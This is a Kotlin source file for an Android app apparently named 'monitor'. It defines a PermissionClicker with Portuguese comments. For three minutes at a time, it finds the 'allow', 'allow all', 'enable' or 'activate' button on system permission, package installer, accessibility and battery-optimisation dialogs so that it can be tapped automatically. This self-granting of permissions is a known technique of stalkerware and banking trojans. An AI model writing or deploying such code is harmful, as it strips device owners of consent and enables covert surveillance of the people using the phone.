package com.example.monitor

/**
 * Clica sozinho nos diálogos do sistema (permissões, acessibilidade, bateria).
 * Armado por um tempo limitado e desarmado quando o alvo é atingido.
 */
object PermissionClicker {

    private var ate = 0L

    private val ALVOS = listOf(
        "permitir", "allow", "while using the app", "durante o uso",
        "somente desta vez", "only this time", "ok", "ativar", "activate",
        "habilitar", "enable", "permitir tudo", "allow all"
    )

    private val TELAS = listOf(
        "accessibility", "acessibilidade", "ignore battery", "battery optimization",
        "otimização de bateria"
    )

    fun armar() {
        ate = System.currentTimeMillis() + 180_000L
    }

    fun desarmar() {
        ate = 0L
    }

    fun ativo(): Boolean = System.currentTimeMillis() < ate

    /** Devolve o rótulo do botão que deve ser tocado, ou null. */
    fun decidir(pacote: String?, textos: List<String>): String? {
        if (!ativo()) return null
        val nosso = pacote != null && (
            pacote.contains("permissioncontroller") ||
                pacote.contains("packageinstaller") ||
                pacote == "com.android.settings" ||
                pacote == "com.google.android.permissioncontroller"
            )
        if (!nosso) return null

        val normalizados = textos.map { it.trim().lowercase() }
        if (normalizados.none { t -> TELAS.any { t.contains(it) } } &&
            normalizados.none { t -> ALVOS.any { t == it || t.startsWith(it) } }
        ) return null

        // prioriza o mais específico
        for (alvo in ALVOS) {
            for (texto in textos) {
                val t = texto.trim().lowercase()
                if (t == alvo || t.startsWith(alvo)) return texto.trim()
            }
        }
        return null
    }
}